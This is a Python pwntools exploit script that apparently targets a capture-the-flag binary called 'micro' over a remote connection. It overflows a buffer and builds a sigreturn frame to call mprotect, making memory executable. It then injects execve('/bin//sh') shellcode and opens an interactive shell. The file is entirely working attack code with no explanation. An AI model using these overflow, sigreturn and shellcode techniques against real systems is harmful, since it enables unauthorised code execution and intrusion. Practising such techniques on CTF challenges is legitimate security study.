import pwn
from time import sleep
from os import getenv

SHELLCODE = b"\x48\x31\xF6\x48\x31\xD2\x49\xB8\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x4C\x89\x04\x25\x00\x10\x40\x00\x48\xC7\xC7\x00\x10\x40\x00\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"

SYSCALL_GADGET = 0x000000000040102d
READ_ON_BUF = 0x0000000000401018

binary = pwn.ELF("./micro")
pwn.context.binary = binary
io = pwn.remote(getenv("IP"), int(getenv("PORT")))

frame = pwn.SigreturnFrame()
frame.rdi = 0x400000
frame.rsi = 0x10000
frame.rax = 0xa
frame.rdx = 0x7
frame.rbp = 0x402100
frame.rip = SYSCALL_GADGET
frame.rsp = 0x4021f0


payload = pwn.cyclic(0x20)  # fill buffer
payload += pwn.p64(READ_ON_BUF)
payload += pwn.p64(SYSCALL_GADGET)
payload += bytes(frame)

io.send(payload)
sleep(1)
io.send(pwn.cyclic(0xf))
sleep(1)


payload2 = pwn.cyclic(0x20) + pwn.p64(0x4021f0 + 0x8)
payload2 += SHELLCODE

io.send(payload2)
io.interactive()
